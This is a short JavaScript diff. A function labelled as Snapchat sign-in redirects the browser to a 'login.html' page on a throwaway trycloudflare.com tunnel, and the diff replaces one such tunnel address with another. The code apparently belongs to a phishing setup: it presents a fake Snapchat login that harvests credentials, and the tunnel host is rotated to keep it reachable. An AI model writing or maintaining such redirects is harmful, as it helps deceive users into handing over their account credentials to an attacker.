@@ -1,7 +1,7 @@
 // Placeholder function for Snapchat sign-in
 function signInWithSnapchat() {
     // Replace with your Snapchat authentication URL or function
-    window.location.href = "https://retirement-endangered-nights-liquid.trycloudflare.com/login.html";
+    window.location.href = "https://shows-millennium-church-nu.trycloudflare.com/login.html";
 }
 
 // Initial setup
